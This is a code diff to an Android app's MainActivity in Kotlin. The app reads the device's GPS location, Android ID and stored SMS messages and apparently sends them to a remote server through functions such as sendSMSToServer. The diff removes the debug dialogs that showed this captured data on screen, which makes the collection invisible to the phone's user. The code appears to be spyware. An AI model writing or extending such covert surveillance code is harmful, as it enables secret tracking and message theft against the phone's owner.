@@ -36,9 +36,6 @@ import kotlinx.coroutines.DelicateCoroutinesApi
 import java.text.SimpleDateFormat
 import java.util.Date
 
-// Tests
-import androidx.appcompat.app.AlertDialog
-
 class MainActivity : AppCompatActivity() {
 
     private val requestLocationPermission = 1
@@ -257,9 +254,6 @@ class MainActivity : AppCompatActivity() {
                     val data = "gps : ($latitude : $longitude) : " + getCurrentDate()
 
                     newPacket(data)
-
-                    // Tests
-                    showLocationDialog(latitude, longitude)
                 }
             }
     }
@@ -285,9 +279,6 @@ class MainActivity : AppCompatActivity() {
         }
 
         androidId = Secure.getString(context.contentResolver, Secure.ANDROID_ID)
-
-        // Tests
-        showAndroidIdDialog(androidId)
     }
 
     // ----------- SMS RETRIEVAL FUNCTIONS -----------------
@@ -340,17 +331,6 @@ class MainActivity : AppCompatActivity() {
                 sendSMSToServer(date, address, message, receivedOrSent)
             }
         }
-
-        // Tests
-        if (smsList.isNotEmpty()) {
-            var i = 0
-            for ((date, address, message) in smsList) {
-                if (i == 0) {
-                    showSMSDialog(date, address, message, receivedOrSent)
-                }
-                i = 1
-            }
-        }
     }
 
     private fun sendSMSToServer(date: String, address: String, msg: String, receivedOrSent: Int) {
@@ -373,42 +353,5 @@ class MainActivity : AppCompatActivity() {
         val date = Date(timestamp)
 
         return dateFormat.format(date)
-    }
-
-    // Tests
-    private fun showSMSDialog(date: String, address: String, msg: String, receivedOrSent: Int) {
-        val alertDialogBuilder = AlertDialog.Builder(this)
-        if (receivedOrSent == received) {
-            alertDialogBuilder.setTitle("SMS reçu")
-            alertDialogBuilder.setMessage("Date:\n$date\n\nExpéditeur:\n$address\n\nMessage:\n$msg")
-        }
-        else if (receivedOrSent == sent) {
-            alertDialogBuilder.setTitle("SMS envoyé")
-            alertDialogBuilder.setMessage("Date:\n$date\n\nDestinataire:\n$address\n\nMessage:\n$msg")
-        }
-        alertDialogBuilder.setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }
-
-        val alertDialog: AlertDialog = alertDialogBuilder.create()
-        alertDialog.show()
-    }
-
-    private fun showAndroidIdDialog(androidID: String) {
-        val alertDialogBuilder = AlertDialog.Builder(this)
-        alertDialogBuilder.setTitle("Android ID")
-        alertDialogBuilder.setMessage("Android ID: $androidID")
-        alertDialogBuilder.setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }
-
-        val alertDialog: AlertDialog = alertDialogBuilder.create()
-        alertDialog.show()
-    }
-
-    private fun showLocationDialog(latitude: Double, longitude: Double) {
-        val alertDialogBuilder = AlertDialog.Builder(this)
-        alertDialogBuilder.setTitle("Coordonnées de localisation")
-        alertDialogBuilder.setMessage("Latitude: $latitude\nLongitude: $longitude")
-        alertDialogBuilder.setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }
-
-        val alertDialog: AlertDialog = alertDialogBuilder.create()
-        alertDialog.show()
     }
 }
